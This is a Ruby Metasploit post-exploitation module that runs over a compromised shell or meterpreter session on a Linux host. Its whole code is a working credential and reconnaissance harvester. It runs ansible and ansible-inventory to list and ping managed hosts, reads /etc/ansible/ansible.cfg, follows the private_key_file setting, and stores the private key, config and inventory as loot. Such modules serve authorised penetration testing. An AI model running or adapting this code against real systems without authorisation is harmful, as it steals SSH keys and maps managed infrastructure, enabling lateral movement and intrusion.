##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Post
  include Msf::Post::File
  include Msf::Auxiliary::Report

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'Ansible Config Gather',
        'Description' => %q{
          This module will grab ansible information including hosts, ping status, and the configuration file.
        },
        'License' => MSF_LICENSE,
        'Author' => [
          'h00die', # Metasploit Module
        ],
        'Platform' => ['linux', 'unix'],
        'SessionTypes' => ['shell', 'meterpreter'],
        'References' => [
        ],
        'Notes' => {
          'Stability' => [CRASH_SAFE],
          'Reliability' => [],
          'SideEffects' => []
        }
      )
    )

    register_options(
      [
        OptString.new('ANSIBLE', [true, 'Ansible executable location', '']),
        OptString.new('ANSIBLEINVENTORY', [true, 'Ansible-inventory executable location', '']),
        OptString.new('ANSIBLECFG', [true, 'Ansible config file location', '']),
        OptString.new('HOSTS', [ true, 'Which ansible hosts to target', 'all' ]),
      ], self.class
    )
  end

  def ansible_exe
    return @ansible if @ansible

    ['/usr/local/bin/ansible', datastore['ANSIBLE']].each do |exec|
      next unless file?(exec)
      next unless executable?(exec)

      @ansible = exec
    end
    @ansible
  end

  def ansible_inventory
    return @ansible_inv if @ansible_inv

    ['/usr/local/bin/ansible-inventory', datastore['ANSIBLEINVENTORY']].each do |exec|
      next unless file?(exec)
      next unless executable?(exec)

      @ansible_inv = exec
    end
    @ansible_inv
  end

  def ansible_cfg
    return @ansible_cfg if @ansible_cfg

    ['/etc/ansible/ansible.cfg', datastore['ANSIBLECFG']].each do |f|
      next unless file?(f)

      @ansible_cfg = f
    end
    @ansible_cfg
  end

  def ping_hosts
    results = cmd_exec("#{ansible_exe} #{datastore['HOSTS']} -m ping -o")
    pings = store_loot('ansible.ping', 'text/plain', session, results, 'ansible.ping', 'Ansible ping status')
    print_good("Stored pings to: #{pings}")
    columns = ['Host', 'Status', 'Ping', 'Changed']
    table = Rex::Text::Table.new('Header' => 'Ansible Pings', 'Indent' => 1, 'Columns' => columns)
    # here's a regex with test: https://rubular.com/r/FMHhWx8QlVnidA
    regex = /(\S+)\s+\|\s+([A-Z]+)\s+=>\s+({.+})$/
    matches = results.scan(regex)

    matches.each do |match|
      match[2] = JSON.parse(match[2])
      table << [match[0], match[1], match[2]['ping'], match[2]['changed']]
    end
    print_good(table.to_s) unless table.rows.empty?
  end

  def conf
    return unless file?(ansible_cfg)

    ansible_config = read_file(ansible_cfg)
    stored_config = store_loot('ansible.cfg', 'text/plain', session, ansible_config, 'ansible.cfg', 'Ansible config file')
    print_good("Stored config to: #{stored_config}")
    ansible_config.lines.each do |line|
      next unless line.start_with?('private_key_file')

      file = line.split(' = ')[1].strip
      print_good("Private key file location: #{file}")
      next unless file?(file)

      key = read_file(file)
      loot = store_loot('ansible.private.key', 'text/plain', session, key, 'private.key', 'Ansible private key')
      print_good("Stored private key file to: #{loot}")
    end
  end

  def hosts_list
    hosts = cmd_exec("#{ansible_inventory} --list")
    hosts = JSON.parse(hosts)
    inventory = store_loot('ansible.inventory', 'application/json', session, hosts, 'ansible_inventory.json', 'Ansible inventory')
    print_good("Stored inventory to: #{inventory}")
    columns = ['Host', 'Connection']
    table = Rex::Text::Table.new('Header' => 'Ansible Hosts', 'Indent' => 1, 'Columns' => columns)
    hosts = hosts.dig('_meta', 'hostvars')
    hosts.each do |host|
      table << [host[0], host[1]['ansible_connection']]
    end
    print_good(table.to_s) unless table.rows.empty?
  end

  def run
    fail_with(Failure::NotFound, 'Ansible executable not found') if ansible_exe.nil?
    hosts_list
    ping_hosts
    conf
  end
end
